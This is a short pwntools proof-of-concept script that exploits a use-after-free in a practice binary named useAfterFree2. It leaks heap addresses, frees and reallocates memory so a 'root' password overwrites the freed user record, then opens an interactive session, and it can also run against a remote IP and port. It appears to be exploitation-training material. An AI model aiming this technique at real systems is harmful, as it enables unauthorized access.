#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


# you can run this script in the following ways:
# run locally without debugger: 
#      ./pwntoolsTest_poc.py
# run in GDB:
#      ./pwntoolsTest_poc.py GDB
# run against a remote target: 
#     ./pwntoolsTest_poc.py REMOTE $IP $PORT

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])

binPath="./useAfterFree2"
isRemote = pwn.args.REMOTE

# build in GDB support
# this is where we can automate our breakpoints
gdbscript = '''
init-pwndbg
break *main+226
break *main+462
continue
'''.format(**locals())

# configure pwntools logging: info, debug you will use the most
pwn.context.log_level="debug"

# create the program object to interact with 
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# start the binary & interact with the program to get to where we can exploit
io = start()

#io.interactive()

# remember to send & receive bytes objects b"example"
io.recvuntil(b"5: Exit")
io.sendline(b"1")
ioCapture = io.recvuntil(b"Insert Username: \n")
io.sendline(b"user")

# get the name addr
nameAddr = int(io.recvline().strip().decode('utf-8').split(':')[1].strip(),16)
pwn.info("Name address: %#x", nameAddr)

# get the password addr
io.recvuntil(b"5: Exit\n")
io.sendline(b"22")

io.recvuntil(b"Insert Password: \n")
io.sendline(b"pass")
junk = io.recvlines(2)

passAddr = int(io.recvline().strip().decode('utf-8').split(':')[1].strip(),16)
pwn.info("Pass address: %#x", passAddr)

io.sendafter(b"5: Exit", b"33")

io.recvuntil(b"5: Exit")
io.sendline(b"22")
io.recvuntil(b"Insert Password: \n")
io.sendline(b"root")

io.sendlineafter(b"5: Exit",b"44")


# go "interactive" with the program
# this will let you send arbitrary input via keyboard
# and/or interact with your shell
io.interactive()
